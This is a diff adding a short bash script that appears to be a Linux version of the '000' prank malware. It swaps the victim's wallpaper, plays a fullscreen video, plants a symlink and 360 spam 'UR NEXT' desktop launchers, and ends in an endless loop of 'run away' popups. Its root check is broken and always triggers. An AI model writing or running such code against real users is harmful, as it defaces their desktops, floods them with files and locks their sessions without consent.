@@ -1,0 +1,16 @@
+source config.sh
+
+if [ $(whoami)=root ]
+then echo ERROR: This Program "000" Cant Run As Root.
+else echo
+fi
+
+gsettings set org.gnome.desktop.background picture-uri "file://$dir/files/ur-next.jpeg"
+
+cvlc --fullscreen $dir/files/000.mp4 --no-video-title-show --play-and-exit
+
+ln -s $dir/files/OPENME.odt "/home/$(whoami)/$desktopfolder/OPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENME"
+
+for i in {1..360};do echo -e "[Desktop Entry]\nVersion=1.0\nX-Desktop-File-Install-Version=0.26\nName=UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT\n Comment=\nIcon=$dir/files/ur-next.png\nType=Application" > "/home/$(whoami)/$desktopfolder/urnext$i.desktop";done
+
+while true;do zenity --title="run away" --info --text="run away" --ok-label="run away" --height 120 --width 120;done
